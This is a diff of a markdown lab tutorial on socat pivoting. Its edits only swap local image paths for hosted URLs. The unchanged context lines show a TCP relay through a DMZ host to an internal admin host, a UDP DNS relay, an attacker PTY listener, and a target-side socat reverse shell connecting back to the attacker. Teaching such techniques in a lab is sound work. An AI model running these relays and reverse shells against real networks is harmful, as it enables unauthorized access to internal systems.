@@ -77,7 +77,7 @@ chmod +x socat
 ./socat ...
 ```
 
-![Image: Installing socat or verifying it's already present on the relay host](./socat_images/socat_on_WebDMZ.png)
+![Image: Installing socat or verifying it's already present on the relay host](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/socat_on_WebDMZ.png)
 
 ### Lab Topology
 
@@ -90,7 +90,7 @@ chmod +x socat
 
 The attacker cannot reach `10.10.10.200` directly. Web DMZ is a Linux host that can see both networks. We'll run socat on it as a relay.
 
-![Image: Lab topology - attacker, Linux Web DMZ pivot, internal Admin Mgmt host](./socat_images/Lab_topology.png)
+![Image: Lab topology - attacker, Linux Web DMZ pivot, internal Admin Mgmt host](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/Lab_topology.png)
 
 ---
 
@@ -117,7 +117,7 @@ Breaking it down:
 > [!NOTE]
 > Without `fork`, socat handles exactly **one** connection and exits. Always include `fork` for a proper persistent relay.
 
-![Image: Socat TCP listener running on Web DMZ - terminal output](./socat_images/Forward-socat-webDMZ.png)
+![Image: Socat TCP listener running on Web DMZ - terminal output](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/Forward-socat-webDMZ.png)
 
 #### Access from the Attacker
 
@@ -136,7 +136,7 @@ socat TCP-LISTEN:8080,fork TCP:10.10.10.200:80 &
 pkill socat
 ```
 
-![Image: Attacker curl command receiving internal admin page via socat relay](./socat_images/connection_2_pivotmgmtViaDMZ.png)
+![Image: Attacker curl command receiving internal admin page via socat relay](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/connection_2_pivotmgmtViaDMZ.png)
 
 ---
 
@@ -151,7 +151,7 @@ pkill socat
 ```bash
 socat UDP-LISTEN:53,fork UDP:10.10.10.200:53
 ```
-![Image: UDP relay running on Web DMZ for DNS forwarding](./socat_images/socat_DNS_Listener.png)
+![Image: UDP relay running on Web DMZ for DNS forwarding](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/socat_DNS_Listener.png)
 
 From the attacker, resolve using the relay:
 
@@ -163,7 +163,7 @@ dig @192.168.1.20 internal.corp.local
 > UDP is connectionless, so `fork` works differently than with TCP - each datagram spawns a new socat process. For high-throughput services this creates many processes. For low-volume protocols like DNS queries, it works perfectly.
 > Also for ports like `53` requires root access to open.
 
-![Image: UDP relay received from Attacker](./socat_images/DNS-Response_Attacker.png)
+![Image: UDP relay received from Attacker](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/DNS-Response_Attacker.png)
 
 ---
 
@@ -186,7 +186,7 @@ socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
 
 This connects the listener to your own terminal in raw mode - when the target connects, your terminal becomes the remote shell directly.
 
-![Image: Attacker socat PTY listener ready on port 4444](./socat_images/SocatTTy-listener.png)
+![Image: Attacker socat PTY listener ready on port 4444](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/SocatTTy-listener.png)
 
 #### Step 2: Connect from the Target
 
@@ -203,7 +203,7 @@ socat exec:'bash -li',pty,stderr,sane TCP:192.168.1.10:4444
 
 The result: a fully usable interactive shell.
 
-![Image: Attacker receiving socat PTY shell - prompt appears, tab completion works](./socat_images/TtyShell_back.png)
+![Image: Attacker receiving socat PTY shell - prompt appears, tab completion works](https://teamsimple.net/api/files/blogs/blogs-a543d0198f514aaebc00d94e0dab5da0-hashed/TtyShell_back.png)
 
 > [!TIP]
 > If `bash` is unavailable, substitute `sh -i` or use the full path: `exec:'/bin/bash -li'`
